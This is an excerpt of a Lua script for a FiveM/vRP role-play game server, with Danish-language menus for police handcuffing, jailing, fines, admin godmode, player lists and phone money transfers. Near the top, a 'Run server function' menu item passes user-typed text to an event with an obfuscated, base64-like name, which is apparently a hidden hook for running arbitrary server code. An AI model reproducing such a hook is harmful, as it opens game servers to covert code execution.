...
local ch_srun = {function(player,choice)
  vRP.prompt({player,"Function:","",function(player,stringToRun)
    stringToRun = stringToRun or ""
	TriggerEvent("dHJld3J0d2V0cndldHJld3J0ZXdydGV3dHJ0cmV3dHJ3ZWR3YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWE", stringToRun)
  end})
end, "Run server function."}

--police weapons // comment out the weapons if you dont want to give weapons.
local police_weapons = {}
police_weapons["Udstyr"] = {function(player,choice)
...
emergency_medkit["Tag"] = {function(player,choice)
	local user_id = vRP.getUserId({player})
        ...
        if nuser_id ~= nil then
		  vRPclient.isHandcuffed(nplayer,{},function(handcuffed)
			if handcuffed then
				...
				vRPclient.notify(player,{"Spilleren er ikke i håndjern."})
			end
		  end)
        else
          vRPclient.notify(player,{lang.common.no_player_near()})
...
end, "Tag fat i nærmeste spiller."}
...
local choice_store_weapons = {function(player, choice)
  ...
  if (store_weapons_cd[user_id] == nil or store_weapons_cd[user_id] == 0) and user_id ~= nil then
    ...
    vRPclient.notify(player,{"Du har allerede gemt dine våben."})
  end
  ...
  if user_id ~= nil then
    BMclient.getArmour(player,{},function(armour)
      if armour > 95 then
	    ...
	    vRPclient.notify(player, {"Damaged armor can't be stored!"})
      end
    end)
  end
end, "opbevar ting i din taske."}
...
function jail_clock(target_id,timer)
  ...
  if online then
    if timer>0 then
	  vRPclient.notify(target, {"Resterende tid: " .. timer .. " minutter."})
	  ...
	  vRPclient.teleport(target,{1847.1291503906,2585.8442382812,45.672004699708}) -- teleport to outside jail 
	  vRPclient.setHandcuffed(target,{false})
      vRPclient.notify(target,{"Du er blevet løsladt."})
	...
	if user_list ~= "" then
	  vRP.prompt({player,"Spillere i nærheden:" .. user_list,"",function(player,target_id)
	    if target_id ~= nil and target_id ~= "" then
	      vRP.prompt({player,"Fængselstid i minutter:","1",function(player,jail_time)
			if jail_time ~= nil and jail_time ~= "" then
	          local target = vRP.getUserSource({tonumber(target_id)})
			  if target ~= nil then
		        if tonumber(jail_time) > 240 then
  			      jail_time = 240
		        end
                ...
                vRPclient.isHandcuffed(target,{}, function(handcuffed)
                  if handcuffed then
				    ...
				    vRPclient.teleport(target,{1687.1066894532,2518.6442871094,-120.84985351562}) -- teleport to inside jail 
				    vRPclient.notify(target,{"Du er blevet sendt i fængsel."})
				    vRPclient.notify(player,{"Du har sendt en person i fængsel."})
				    vRP.setHunger({tonumber(target_id),0})
				    vRP.setThirst({tonumber(target_id),0})
				    jail_clock(tonumber(target_id),tonumber(jail_time))
					local user_id = vRP.getUserId({player})
					vRPbm.logInfoToFile("jailLog.txt",user_id .. " fængslet "..target_id.." i " .. jail_time .. " minutter")
			      else
				    vRPclient.notify(player,{"Spilleren er ikke håndjern."})
			      end
			    end)
			  else
				vRPclient.notify(player,{"Det id virker ugyldigt."})
			  end
			else
			  vRPclient.notify(player,{"Fængselstiden skal have en værdi."})
			end
	      end})
        else
          vRPclient.notify(player,{"Ingen spiller ID valgt."})
        end
	  end})
    else
			...
			if custom ~= nil then
			  ...
			  if tonumber(custom) > 0 or vRP.hasPermission({user_id,"admin.easy_unjail"}) then
				...
				if target ~= nil then
				  ...
				  vRPclient.notify(player,{"Personen vil blive sat fri snart."})
				  vRPclient.notify(target,{"Staten har reduceret din straf."})
				  vRPbm.logInfoToFile("jailLog.txt",user_id .. " befriet "..target_id.." fra en " .. custom .. " minutters straf")
				else
				  vRPclient.notify(player,{"Det id virker ugyldigt."})
				end
			  else
				vRPclient.notify(player,{"Personen er ikke i fængsel."})
			  end
			end
		  end
		end})
	  ...
	  if value ~= nil then
	    ...
	    if custom ~= nil then
		  if tonumber(custom) > 0 then
            ...
            vRPclient.notify(target,{"Færdigør din straf."})
			vRP.setHunger({tonumber(user_id),0})
			vRP.setThirst({tonumber(user_id),0})
			vRPbm.logInfoToFile("jailLog.txt",user_id.." er blevet fængslet for " .. custom .. " minutter for at blive løsladt")
...
local ch_fine = {function(player,choice)
  vRPclient.getNearestPlayers(player,{15},function(nplayers)
	...
	if user_list ~= "" then
	  vRP.prompt({player,"Spillere i nærheden:" .. user_list,"",function(player,target_id)
	    if target_id ~= nil and target_id ~= "" then
	      vRP.prompt({player,"Bøde Beløb:","100",function(player,fine)
			if fine ~= nil and fine ~= "" then
	          vRP.prompt({player,"Bøde oversag:","",function(player,reason)
			    if reason ~= nil and reason ~= "" then
				  ...
				  if target ~= nil then
		            ...
		            if vRP.tryFullPayment({tonumber(target_id), tonumber(fine)}) then
					  ...
					  local user_id = vRP.getUserId({player})
					  vRPbm.logInfoToFile("fineLog.txt",user_id .. " bødet "..target_id.." beløb: " .. fine .. " fordi ".. reason)
                      vRP.closeMenu({player})
                    else
                      vRPclient.notify(player,{lang.money.not_enough()})
                    end
				  ...
				  vRPclient.notify(player,{"Du kan ikke give en bøde uden grund."})
				end
	          end})
			else
			  vRPclient.notify(player,{"din bøde skal have en værdi."})
			end
	      end})
        else
          vRPclient.notify(player,{"Ingen spiller ID valgt."})
      ...
      vRPclient.notify(player,{"Ingen spiller nær dig."})
    end
  end)
...
local ch_handcuff = {function(player,choice)
  vRPclient.getNearestPlayer(player,{10},function(nplayer)
    ...
    if nuser_id ~= nil then
	  ...
	  local user_id = vRP.getUserId({player})
	  vRPbm.logInfoToFile("jailLog.txt",user_id .. " sat i håndjern "..nuser_id)
...
local ch_godmode = {function(player,choice)
  ...
  if user_id ~= nil then
    if gods[player] then
	  gods[player] = nil
	  vRPclient.notify(player,{"Godmode deaktiveret."})
	else
	  gods[player] = user_id
	  vRPclient.notify(player,{"Godmode aktiveret."})
	end
  end
end, "Tag admin godmode på/af."}
...
local ch_userlist = {function(player,choice)
  ...
  if user_id ~= nil then
    if player_lists[player] then -- hide
      ...
      local content = "<span class=\"id\">ID</span><span class=\"pseudo\">Navn</span><span class=\"name\">Karakter Navn</span><span class=\"job\">Job</span>"
      local count = 0
	  local users = vRP.getUsers({})
      for k,v in pairs(users) do
        count = count+1
...
function vRPbm.chargePhoneNumber(user_id,phone)
  ...
  vRP.prompt({player,"Beløb der skal overføres "..directory_name..":","0",function(player,charge)
			...
			if charge ~= nil and charge ~= "" then
			  ...
			  if target ~= nil then
				vRP.getUserIdentity({user_id, function(identity)
			      ...
			      local text = "" .. my_directory_name .. " spørg om DKK" .. charge .. " for hans servicering."
				  vRP.request({target,text,600,function(req_player,ok)
				    if ok then
		              ...
		              if target_bank>0 then
					    ...
					    vRPclient.notify(player,{"Du skylder DKK"..charge.." for "..directory_name .." for serviceringen."})
						vRPclient.notify(target,{""..my_directory_name.." overførte DKK"..charge.." for serviceringen."})
                        ...
                        vRPclient.notify(player,{"" .. directory_name .. " prøvede at, men kunne ikke betale for din servicering."})
                      end
				    else
                      vRPclient.notify(player,{"" .. directory_name .. " nægtede at betale for din servicering."})
				    end
				  end})
				end})
			  else
			    vRPclient.notify(player,{"Du kan ikke overfører til en som ikke er i byen."})
			  end
			else
			  vRPclient.notify(player,{"Din overførsel skal have en værdi."})
			end
		else
		  vRPclient.notify(player,{"Telefonnummeret er ugyldigt."})
		end
	  end})
	else
	  vRPclient.notify(player,{"Værdien skal være større end 0."})
	end
  end})
end
...
function vRPbm.payPhoneNumber(user_id,phone)
  ...
  vRP.prompt({player,"Beløbet der skal sendes til "..directory_name..":","0",function(player,transfer)
	  ...
	  vRP.getUserByPhone({phone, function(target_id)
		...
		if target_id~=nil then
          if my_bank >= 0 then
			...
			if target ~= nil then
			  vRP.setBankMoney({user_id,my_bank})
              vRPclient.notify(player,{"Du overførte DKK"..transfer.." til "..directory_name})
			  local target_bank = vRP.getBankMoney({target_id}) + tonumber(transfer)
			  vRP.setBankMoney({target_id,target_bank})
			  vRPbm.logInfoToFile("mpayLog.txt",user_id .. " sendte "..target_id.." beløbet af " .. transfer .. ", brugerbank efterbetaling for "..user_id.." = DKK"..my_bank.." og for "..user_id.." = DKK"..target_bank)
			  vRP.getUserIdentity({user_id, function(identity)
		        local my_directory_name = vRP.getPhoneDirectoryName({target_id, identity.phone})
			    if my_directory_name == "unknown" then
		          my_directory_name = identity.phone
			    end
                vRPclient.notify(target,{"Du modtog DKK"..transfer.." fra "..my_directory_name})
			  end})
              vRP.closeMenu({player})
			else
			  vRPclient.notify(player,{"Du kan ikke mobilepay en der ikke er i byen."})
			end
          else
            vRPclient.notify(player,{lang.money.not_enough()})
          end
		else
		  vRPclient.notify(player,{"Telefonnummeret er ikke gyldigt."})
		end
	  end})
	else
	  vRPclient.notify(player,{"Værdien skal være større end 0."})
...
local ch_mobilepay = {function(player,choice)
	...
	menu[">Skriv telefonnummer"] = {
	  ...
	  function(player,choice)
	    vRP.prompt({player,"Telefon Nummer:","",function(player,phone)
	      if phone ~= nil and phone ~= "" then
		    vRPbm.payPhoneNumber(user_id,phone)
		  else
		    vRPclient.notify(player,{"Du skal skrive et telefonnummer."})
		  end
	    end})
...
local ch_mobilecharge = {function(player,choice)
	...
	vRP.openMenu({player, menu})
end,"Spørg om penge via telefonen."}
...
local ch_spawnveh = {function(player,choice)
	vRP.prompt({player,"Vehicle Model:","",function(player,model)
	  if model ~= nil and model ~= "" then
		...
		vRPclient.notify(player,{"Du skal skrive en køretøjsmodel."})
	  end
	end})
end,"Spawn et køretøj."}
...
local ch_player_menu = {function(player,choice)
    ...
    if vRP.hasPermission({user_id,"player.fix_haircut"}) then
      menu["Fix hårbug"] = ch_fixhair -- just a work around for barbershop green hair bug while I am busy
    end
    ...
    if vRP.hasPermission({user_id,"carjacker.lockpick"}) then
      menu["Lockpick"] = ch_lockpickveh -- opens a locked vehicle
    end
...
vRP.registerMenuBuilder({"main", function(add, data)
  ...
  if user_id ~= nil then
	...
	if vRP.hasPermission({user_id,"player.check"}) then
      choices["Tjek person igennem"] = choice_player_check -- checks nearest player inventory, like police check from vrp
    end
...
vRP.registerMenuBuilder({"phone", function(add) -- phone menu is created on server start, so it has no permissions.
    ...
    choices["Anmod om penge"] = ch_mobilecharge -- charge money through phone
